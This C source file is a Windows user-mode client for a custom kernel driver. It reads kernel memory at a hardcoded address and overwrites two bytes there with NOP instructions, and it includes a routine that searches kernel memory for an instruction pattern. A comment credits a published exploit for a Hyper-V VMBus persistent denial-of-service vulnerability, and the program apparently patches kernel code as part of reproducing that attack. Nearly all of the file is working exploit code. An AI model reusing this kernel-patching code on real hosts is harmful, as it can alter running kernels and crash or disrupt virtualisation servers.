#include <stdio.h>
#include <windows.h>
#include "..\drv\common.h"
#include <winioctl.h>

/*
Based on exploit code from:
http://www.coresecurity.com/content/hyperv-vmbus-persistent-dos-vulnerability
*/

HANDLE openHandle()
{	
	HANDLE Handle = CreateFile(
		"\\\\.\\KernMemCtrler",
		GENERIC_READ|GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);	

	return Handle;
}


typedef struct _FINDMEMDESCRIPT
{
	struct _FHEADER
	{
		unsigned int address;
		unsigned int length;
	} FHEADER;

	unsigned char buffer[5];

}FINDMEMDESCRIPT,*PFINDMEMDESCRIPT;
BOOL findPattern(HANDLE hDevice, unsigned int* outMemAddr)
{
	BOOL bRc;
	BOOL found = FALSE;
	FINDMEMDESCRIPT findMemDescript;
	char pattern[] = "\xe8\xc7\x6f\xff\xff";
	unsigned int memAddr = 0;
	DWORD bytesReturned = 0;

	if(outMemAddr == NULL)
	{
		return FALSE;
	}

	findMemDescript.FHEADER.address = 0x80000000;
	findMemDescript.FHEADER.length = sizeof(pattern) - 1;
	memcpy(findMemDescript.buffer, pattern, sizeof(pattern) - 1);

	bRc = DeviceIoControl ( 
		hDevice,
		(DWORD) IOCTL_HYPVUSERIO_SEARCH_MEM,
		&findMemDescript,
		sizeof(findMemDescript),
		&memAddr,
		sizeof( memAddr),
		&bytesReturned,
		NULL);
	if ( !bRc )
	{
		printf( "Error finding pattern : %d", GetLastError());
		return FALSE;
	}

	if(bytesReturned != 0 && memAddr != 0)
	{
		found = TRUE;
		(*outMemAddr) = memAddr;
	}

	return found;
}


int readKernelMemory(HANDLE hDevice, unsigned int addr, char* buffer, unsigned int length)
{	
	BOOL bRc;	
	MEMDESCRIPT memDescript;	
	DWORD bytesReturned = 0;	
	
	//found at 4143055082
	memDescript.HEADER.address = addr;
	memDescript.HEADER.length = length;

	bRc = DeviceIoControl ( 
		hDevice,
		(DWORD) IOCTL_HYPVUSERIO_READ_KERNEL_MEM,
		&memDescript,
		sizeof(memDescript),
		buffer,
		length,
		&bytesReturned,
		NULL);
	if ( !bRc )
	{
		printf( "Error reading kernel memory : %d", GetLastError());
		return -1;
	}

	return bytesReturned;
}


#define MAX_WRITE_SIZE 1024
typedef struct _WRMEMDESCRIPT
{
	struct _WRHEADER
	{
		unsigned int address;
		unsigned int length;
	} WRHEADER;

	unsigned char buffer[MAX_WRITE_SIZE];

}WRMEMDESCRIPT,*PWRMEMDESCRIPT;
int writeKernelMemory(HANDLE hDevice, unsigned int addr, char* buffer, unsigned int length)
{
	BOOL bRc;	
	WRMEMDESCRIPT memDescript;
	DWORD bytesReturned = 0;
	unsigned int status = 0;
	int ret = 0;

	//found at 4143055082
	memDescript.WRHEADER.address = addr;
	memDescript.WRHEADER.length = length;

	if(length > MAX_WRITE_SIZE)
		{ return -1; }
	memcpy(memDescript.buffer, buffer, length);

	bRc = DeviceIoControl ( 
		hDevice,
		(DWORD) IOCTL_HYPVUSERIO_WRITE_KERNEL_MEM,
		&memDescript,
		sizeof(memDescript),
		&status,
		sizeof(status),
		&bytesReturned,
		NULL);
	if ( !bRc )
	{
		printf( "Error writing kernel memory : %d", GetLastError());
		return -1;
	}

	if(0 == bytesReturned || status != 0)
	{
		ret = -1;
	}

	return ret;
}


#define READ_BUFF_SIZE 20
int main(int argc, char* argv[])
{	
	BOOL found = FALSE;
	unsigned int memAddr = 0;
	unsigned char readBuffer[READ_BUFF_SIZE];
	unsigned char writeBuffer[] = { 0x90, 0x90 };
	unsigned int buffChar;
	unsigned char tempChar;
	int ret = 0;
	int i = 0;


	HANDLE handle = openHandle();
	if( handle == INVALID_HANDLE_VALUE )
		{ printf("Failed to open driver code %d\n", GetLastError()); return 1; }
	

	/*found = findPattern(handle, &memAddr);
	if(found)
		{ printf("found at addr %u\n", memAddr); }
	else
		{ printf("not found\n"); }*/


	ZeroMemory(readBuffer, sizeof(readBuffer));
	ret = readKernelMemory(handle, 4143055082, readBuffer, sizeof(readBuffer));
	if(ret < 0)
		{ printf("Error reading kernel memory\n"); }
	else
	{
		printf("Got %d bytes\n", ret);
		for(i = 0; i < ret; i++)
		{
			memcpy(&tempChar, &readBuffer[i], 1);
			buffChar = tempChar;
			printf("0x%X\n", buffChar);			
		}
	}


	ret = writeKernelMemory(handle, 4143055082, writeBuffer, sizeof(writeBuffer));
	if(ret < 0)
		{ printf("Error writing kernel memory\n"); }
	else
		{ printf("Memory written!\n"); }


	ZeroMemory(readBuffer, sizeof(readBuffer));
	ret = readKernelMemory(handle, 4143055082, readBuffer, sizeof(readBuffer));
	if(ret < 0)
	{ printf("Error reading kernel memory\n"); }
	else
	{
		printf("Got %d bytes\n", ret);
		for(i = 0; i < ret; i++)
		{
			memcpy(&tempChar, &readBuffer[i], 1);
			buffChar = tempChar;
			printf("0x%X\n", buffChar);			
		}
	}


	return 0;
}

